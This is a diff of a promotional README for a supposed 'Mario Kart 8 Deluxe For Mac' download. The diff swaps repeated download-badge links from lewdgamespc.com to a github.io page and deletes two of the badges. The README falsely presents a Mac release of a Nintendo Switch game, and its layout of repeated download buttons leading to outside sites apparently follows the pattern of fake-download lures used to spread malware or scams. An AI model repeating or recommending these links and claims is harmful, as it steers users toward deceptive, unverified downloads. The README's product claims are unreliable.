@@ -9,7 +9,7 @@ Mario Kart 8 Deluxe is the most innovative, Mac-compatible arcade racing experie
 
 <div align="center">
 
-[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://lewdgamespc.com/dr-gira/)
+[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://mario-kart-8-deluxe-macos.github.io/Mario-Kart-8-Deluxe/)
 
 </div>
 
@@ -52,7 +52,7 @@ The **Mac-focused configuration** stands above typical DIY attempts through a co
 
 The **player experience** provides unmatched fun, supporting recent macOS releases with carefully chosen options. A dedicated support and guide ecosystem helps you get up and running quickly, with tips, FAQs, and walkthroughs.
 
-[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://lewdgamespc.com/dr-gira/)
+[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://mario-kart-8-deluxe-macos.github.io/Mario-Kart-8-Deluxe/)
 
 ---
 
@@ -93,9 +93,6 @@ The **player experience** provides unmatched fun, supporting recent macOS releas
 - Adjust your preferred graphics, audio, and controller settings if needed.
 - Start your adventure and enjoy the game.
 
-
-[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://lewdgamespc.com/dr-gira/)
-
 ---
 
 ## System Requirements
@@ -124,8 +121,6 @@ The **player experience** provides unmatched fun, supporting recent macOS releas
 - Better window and display management
 
 **Note:** The latest configuration performs best on Apple Silicon Macs. Graphics and responsiveness are significantly improved on newer hardware compared to older Intel machines.
-
-[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://lewdgamespc.com/dr-gira/)
 
 ---
 
@@ -159,4 +154,6 @@ The **Mac-focused racing setup** ensures you have a playful, accessible way to e
 
 **Ready to race on your Mac? Download Mario Kart 8 Deluxe For Mac now and join thousands of players drifting around the track!**
 
-[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://lewdgamespc.com/dr-gira/)
+[![Download Mario Kart 8 Deluxe For Mac](https://img.shields.io/badge/Download%20Mario%20Kart%208%20Deluxe%20For%20Mac-brightgreen?style=for-the-badge&logo=apple)](https://mario-kart-8-deluxe-macos.github.io/Mario-Kart-8-Deluxe/)
+
+---
